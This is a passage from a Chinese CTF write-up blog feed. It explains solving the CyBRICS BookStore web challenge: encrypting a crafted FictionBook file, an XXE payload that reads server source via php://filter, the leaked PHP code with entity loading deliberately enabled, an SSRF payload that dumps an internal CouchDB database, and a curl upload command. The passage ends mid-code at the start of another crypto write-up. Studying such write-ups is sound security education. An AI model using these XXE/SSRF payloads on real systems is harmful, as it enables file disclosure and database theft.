class="line">    enc = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">16</span>):</span><br><span class="line">        enc.extend(encrypt_block(data[i:i + <span class="number">16</span>]))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">r = encrypt(open(<span class="string">'evil.xml'</span>).read())</span><br><span class="line">open(<span class="string">'evil.fb2enc'</span>, <span class="string">'w'</span>).write(r)</span><br></pre></td></tr></table></figure><p>接下来构造恶意 xml 并加密上传, 这个可以把正文给删了, 节省加密时间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/proc/self/cwd/index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FictionBook</span> <span class="attr">xmlns:l</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.gribuser.ru/xml/fictionbook/2.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">title-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">genre</span>&gt;</span>fiction<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Антуан<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">middle-name</span>&gt;</span>де Сент<span class="tag">&lt;/<span class="name">middle-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Экзюпери<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">book-title</span>&gt;</span>Маленький Принц<span class="tag">&lt;/<span class="name">book-title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">annotation</span>&gt;</span></span><br><span class="line">                123</span><br><span class="line">            <span class="tag">&lt;/<span class="name">annotation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">date</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">coverpage</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">l:href</span>=<span class="string">"#cover.jpg"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">coverpage</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">lang</span>&gt;</span>ru<span class="tag">&lt;/<span class="name">lang</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-lang</span>&gt;</span>fr<span class="tag">&lt;/<span class="name">src-lang</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">translator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Нора<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Галь<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">home-page</span>&gt;</span>http://www.vavilon.ru/noragal/content.html<span class="tag">&lt;/<span class="name">home-page</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">translator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">title-info</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">document-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Дмитрий<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">middle-name</span>&gt;</span>Петрович<span class="tag">&lt;/<span class="name">middle-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Грибов<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>grib@gribuser.ru<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Faiber<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>faiber@yandex.ru<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">program-used</span>&gt;</span>FB Tools<span class="tag">&lt;/<span class="name">program-used</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">date</span>&gt;</span>2006-01-14<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-url</span>&gt;</span>http://www.vavilon.ru/noragal/pp/<span class="tag">&lt;/<span class="name">src-url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-ocr</span>&gt;</span>Справочная Служба Русского Языка<span class="tag">&lt;/<span class="name">src-ocr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>0CB33702-6AE9-4377-9AFA-3BA2EF2F37F6<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">history</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>v 1.1 — дополнительное форматирование — Faiber<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>v 1.2 — изменена обложка — Faiber<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">history</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">publish-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">book-name</span>&gt;</span>Маленький Принц<span class="tag">&lt;/<span class="name">book-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">city</span>&gt;</span>Фрунзе<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">year</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">publish-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">custom-info</span> <span class="attr">info-type</span>=<span class="string">"general"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Антуан де Сент-Экзюпери<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">empty-line</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Маленький принц<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">            123</span><br><span class="line">        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FictionBook</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后利用 xxe, 就能读文件了, 这里各种尝试, fuzz 出来 <code>/proc/self/cwd/index.php</code>, 可以直接读到源码.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">save2db</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"Content-type: application/json"</span>,</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        $data = json_encode($data);</span><br><span class="line">            </span><br><span class="line">        $myCurl = curl_init();</span><br><span class="line">        curl_setopt_array($myCurl, <span class="keyword">array</span>(</span><br><span class="line">            CURLOPT_URL =&gt; <span class="string">'http://127.0.0.1:5984/library'</span>,</span><br><span class="line">            CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_HTTPHEADER =&gt; $headers,</span><br><span class="line">            CURLOPT_ENCODING =&gt; <span class="string">'gzip,deflate'</span>,</span><br><span class="line">            CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_POSTFIELDS =&gt; $data</span><br><span class="line">        ));</span><br><span class="line">        $response = curl_exec($myCurl);</span><br><span class="line">        curl_close($myCurl);</span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($xmlfile)</span> </span>&#123;</span><br><span class="line">        libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT);</span><br><span class="line">        $creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($creds-&gt;description)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Description not found"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($creds-&gt;description-&gt;&#123;<span class="string">'title-info'</span>&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Title info not found"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $titleinfo = $creds-&gt;description-&gt;&#123;<span class="string">'title-info'</span>&#125;;</span><br><span class="line">        <span class="keyword">foreach</span> ([<span class="string">'genre'</span>, <span class="string">'author'</span>, <span class="string">'book-title'</span>, <span class="string">'annotation'</span>, <span class="string">'date'</span>, <span class="string">'lang'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!property_exists($titleinfo, $item)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $item . <span class="string">" not found"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        save2db([<span class="string">'title'</span> =&gt; base64_encode($titleinfo-&gt;&#123;<span class="string">'book-title'</span>&#125;), <span class="string">'date'</span> =&gt; $titleinfo-&gt;&#123;<span class="string">'date'</span>&#125;, <span class="string">'url'</span> =&gt; bin2hex(random_bytes(<span class="number">16</span>))]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $titleinfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $results = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"newbook"</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">'newbook'</span>][<span class="string">'error'</span>] == UPLOAD_ERR_OK</span><br><span class="line">            &amp;&amp; is_uploaded_file($_FILES[<span class="string">'newbook'</span>][<span class="string">'tmp_name'</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line"></span><br><span class="line">            $name = $_FILES[<span class="string">'newbook'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            exec(<span class="string">"/var/www/main d "</span> . $name . <span class="string">" "</span> . $name . <span class="string">".decoded"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!is_file($name . <span class="string">".decoded"</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Decoding ERROR"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                $data = file_get_contents($name . <span class="string">".decoded"</span>);</span><br><span class="line">                $data = gzuncompress($data);</span><br><span class="line">                $results = process($data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;<span class="keyword">New</span> CyBRICS BookStore&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;link href=<span class="string">"../css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom box-shadow"&gt;</span><br><span class="line">    &lt;h5 class="my-0 mr-md-auto font-weight-normal"&gt;CyBRICS BookStore&lt;/h5&gt;</span><br><span class="line">    &lt;nav class="my-2 my-md-0 mr-md-3"&gt;</span><br><span class="line">        &lt;a class="p-2 text-dark" href="#"&gt;Authors zone&lt;/a&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;a class="btn btn-outline-primary" href="#"&gt;Sign up&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center"&gt;</span><br><span class="line">    &lt;h1 class="display-4"&gt;Authors zone&lt;/h1&gt;</span><br><span class="line">    &lt;p class="lead"&gt;Our site is under development, but you already can &lt;a href=""&gt;download DRM&lt;/a&gt; and demo books&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;You can add your book&lt;/h2&gt;</span><br><span class="line">        &lt;div&gt;&lt;small&gt;* You will be further informed about review results&lt;/small&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"/authorszone/index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"newbook"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit for review"</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div style=<span class="string">"margin-top: 10px"</span>&gt;</span><br><span class="line">            &lt;table class="table table-striped"&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">if</span> (is_object($results)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Book is under review:&lt;/h2&gt;"</span>;</span><br><span class="line">                    <span class="keyword">foreach</span> ([<span class="string">'genre'</span>, <span class="string">'author'</span>, <span class="string">'book-title'</span>, <span class="string">'annotation'</span>, <span class="string">'date'</span>, <span class="string">'lang'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$item.<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$results-&gt;&#123;$item&#125;-&gt;asXML().<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> $results;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;footer class="pt-4 my-md-5 pt-md-5 border-top"&gt;</span><br><span class="line">        &lt;div class="row"&gt;</span><br><span class="line">            &lt;div class="col-12 col-md"&gt;</span><br><span class="line">                &lt;img class="mb-2" src="https://getbootstrap.com/assets/brand/bootstrap-solid.svg" alt="" width="24" height="24"&gt;</span><br><span class="line">                &lt;small class="d-block mb-3 text-muted"&gt;&amp;copy; 2018&lt;/small&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- Bootstrap core JavaScript</span><br><span class="line">================================================== --&gt;</span><br><span class="line">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> integrity=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到为了绕过 libxml 自带的安全措施, 出题人也是煞费苦心 233.<br>在源码里面可以发现用了 <code>couchdb</code>, 好在支持 http 协议, 我们通过 http 访问 <code>couchdb</code> 的各种 API.<br>翻了翻文档, 可以发现用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:5984/library/_changes?include_docs=true" &gt;]&gt;</span></span><br></pre></td></tr></table></figure><p>就能直接脱裤 (比较大, 浏览器会卡死, 建议直接 curl 脱  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://45.77.219.97/authorszone/index.php'</span> -H <span class="string">'Cache-Control: max-age=0'</span> -H <span class="string">'Origin: http://45.77.219.97'</span> -H <span class="string">'Upgrade-Insecure-Requests: 1'</span> -H <span class="string">'DNT: 1'</span>  -H <span class="string">'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'</span> -H <span class="string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span> -H <span class="string">'Referer: http://45.77.219.97/authorszone/index.php'</span> -F <span class="string">'newbook=@evil.fb2enc'</span> --compressed --insecure -vv -o asd2.html</span><br></pre></td></tr></table></figure><p>得到 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;seq&quot;:1,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000a2b&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-d8bf4bb75eae1dd6117c8a59b952e27e&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000a2b&quot;,&quot;_rev&quot;:&quot;1-d8bf4bb75eae1dd6117c8a59b952e27e&quot;,&quot;title&quot;:&quot;Mona Lisa Overdrive&quot;,&quot;url&quot;:&quot;4cb21fe9786c74f0b83f1fa808e30e4d&quot;&#125;&#125;,</span><br><span class="line">&#123;&quot;seq&quot;:2,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000ac6&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-4802d0cdd11425ffcc9500b5f5db9a56&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000ac6&quot;,&quot;_rev&quot;:&quot;1-4802d0cdd11425ffcc9500b5f5db9a56&quot;,&quot;title&quot;:&quot;Small Prince&quot;,&quot;url&quot;:&quot;6506dad64d2353f25cca891f81443a8e&quot;&#125;&#125;,</span><br><span class="line">&#123;&quot;seq&quot;:3,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000ba3&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-094bdefdba07bc63ae11584c79c51909&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000ba3&quot;,&quot;_rev&quot;:&quot;1-094bdefdba07bc63ae11584c79c51909&quot;,&quot;title&quot;:&quot;Flag Book&quot;,&quot;url&quot;:&quot;3ba9318b509034cb7b506df0faef4d80&quot;&#125;&#125;,</span><br></pre></td></tr></table></figure><p>结合 url 的参数, 在 <code>http://45.77.219.97/books/3ba9318b509034cb7b506df0faef4d80.fb2enc</code> 就能下到 Flag Book 啦.<br>解密一下, 然后就可以找到在里面的 flag 一枚</p><p><img src="https://i.loli.net/2019/07/22/5d351ec06428750220.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.&lt;br&gt;(早知道早点起床做题了&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
      <category term="crypto" scheme="https://rmb122.com/tags/crypto/"/>
    
      <category term="misc" scheme="https://rmb122.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2019 baby_crypto &amp; baby_aes</title>
    <link href="https://rmb122.com/2019/05/22/RCTF2019-baby-crypto-baby-aes-Writeup/"/>
    <id>https://rmb122.com/2019/05/22/RCTF2019-baby-crypto-baby-aes-Writeup/</id>
    <published>2019-05-22T09:51:21.000Z</published>
    <updated>2019-07-22T01:47:16.145Z</updated>
    
    <content type="html"><![CDATA[<p>密码学只做出来两题 baby, 暗示我还是学密码学的 baby (逃</p><a id="more"></a><h2 id="baby-crypto"><a href="#baby-crypto" class="headerlink" title="baby_crypto"></a>baby_crypto</h2><p>这题还算比较常规, 主要逻辑如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"Input your cookie:"</span>)</span><br><span class="line">        data_hex = 